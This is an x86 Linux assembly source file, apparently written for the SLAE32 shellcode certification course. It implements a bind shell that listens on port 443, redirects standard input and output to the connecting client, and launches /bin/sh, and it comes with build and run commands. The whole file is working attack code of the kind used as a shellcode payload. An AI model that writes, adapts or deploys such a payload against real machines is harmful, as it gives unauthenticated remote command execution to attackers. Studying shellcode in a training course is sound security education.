;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Filename : bindshell.nasm                         ;
; Author   : Jean-Pierre LESUEUR                    ;
; Website  : https://www.phrozen.io/                ;
; Email    : jplesueur@phrozen.io                   ;
; Twitter  : @DarkCoderSc                           ;
;                                                   ;
; --------------------------------------------------;
; SLAE32 Certification Exercise N°1                 ;
; (Pentester Academy).                              ; 
; https://www.pentesteracademy.com                  ;
; --------------------------------------------------;
;                                                   ;
; Purpose:                                          ;
; --------------------------------------------------;
; Bind Shell                                        ;
; Bind to 0.0.0.0:443 by default                    ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; nasm -f elf32 -o bindshell.o bindshell.nasm
; ld -o bindshell bindshell.o
; ./bindshell

global _start			

section .text

_start:
	mov ebp, esp
	
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	xor esi, esi                   ; will contain our socket handle

	;--------------------------------------------------------------------
	; fill 30 lower stack addresses with zero
	; sufficient for our payload
	;--------------------------------------------------------------------
	xor ecx, ecx
	mov cl, 0x1e

_zeromemory:
	push eax                        ; push 0x00000000 to stack
 
	loop _zeromemory

	mov esp, ebp                    ; stack pointer to initial location	

	;--------------------------------------------------------------------
	; socket()
	;--------------------------------------------------------------------
	mov bl, 0x1                     ; SYS_SOCKET
		
	mov byte [esp-0x8], 0x1         ; SOCK_STREAM
	mov byte [esp-0xc], 0x2         ; AF_INET

	sub esp, 0xc
	mov ecx, esp

	mov al, 0x66                    ; socketcall() syscall number 
	int 0x80      
	
	mov esi, eax                    ; save new socket handle

	;--------------------------------------------------------------------
	; setsockopt()
	;--------------------------------------------------------------------
	xor eax, eax
	add bl, 0xd                     ; SYS_SETSOCKOPT

	mov byte [esp-0x4], 0x4         ; length of socklen_t
	sub esp, 0x4

	mov dword [esp-0x4], esp        ; addr of socklen_t
	mov byte [esp-0x8], 0x2         ; SO_REUSEADDR
	mov byte [esp-0xc], 0x1         ; SOL_SOCKET
	mov dword [esp-0x10], esi       ; socket handle

	sub esp, 0x10

	mov ecx, esp

	mov al, 0x66                    ; socketcall() syscall number 
	int 0x80

	;--------------------------------------------------------------------
	; bind()
	;--------------------------------------------------------------------
	xor eax, eax
	sub bl, 0xc                     ; SYS_BIND

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	; struct sockaddr_in /* Size = 16B */ {       ;;
	;	short    sin_family;		// 2B         ;;
	;	unsigned short sin_port;	// 2B         ;;
	;	long     s_addr;            // 4B         ;;
	;	char     sin_zero[8];		// 8B         ;;
	; }                                           ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	; prepare sockaddr_in struct

	mov al, 0x01
	mov ah, 0xbb
	mov word [esp-0xe], ax          ; port = 443
	mov byte [esp-0x10], 0x2        ; AF_INET

	xor eax, eax
	mov al, 0x10
	sub esp, eax
	
	mov byte [esp-0x4], 0x10        ; length sockaddr_in (16 Bytes)
	mov dword [esp-0x8], esp        ; addr of sockaddr_in

	mov dword [esp-0xc], esi        ; our socket handle

	sub esp, 0xc
	mov ecx, esp
	
	xor eax, eax
	mov al, 0x66                    ; socketcall() syscall number          
	int 0x80                  

	;--------------------------------------------------------------------
	; listen()
	;--------------------------------------------------------------------
	add bl, 2                       ; SYS_LISTEN	

	mov dword [esp-0x8], esi        ; out socket handle

	sub esp, 0x8
	mov ecx, esp

	mov al, 0x66                    ; socketcall() syscall number          
	int 0x80           

	;--------------------------------------------------------------------
	; accept()
	;--------------------------------------------------------------------
	inc bl                          ; SYS_ACCEPT

	mov [esp-0xc], esi              ; out socket handle

	sub esp, 0xc

	mov ecx, esp

	mov al, 0x66                    ; socketcall() syscall number  
	int 0x80           

	mov ebx, eax                    ; assign our new client socket to ebx

	;--------------------------------------------------------------------
	; dup2() : Loop from 0 to 2 
	;          (stdin, stdout, stderr)
	;--------------------------------------------------------------------
	xor ecx, ecx
_dup2:	
	xor eax, eax	

	mov al, 0x3f       
	int 0x80  

	inc cl
	cmp cl, 0x2
	jle _dup2     

	;--------------------------------------------------------------------
	; execve()
	;--------------------------------------------------------------------
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	; /bin/sh
	mov dword [esp-0x8], 0x68732f2f
	mov dword [esp-0xc], 0x6e69622f
	sub esp, 0xc

	mov ebx, esp

	sub esp, 0x4

	mov edx, esp

	mov dword [esp-0x4], ebx
	sub esp, 0x4

	mov ecx, esp
	
	mov al, 0xb                     ; execve() syscall number
	int 0x80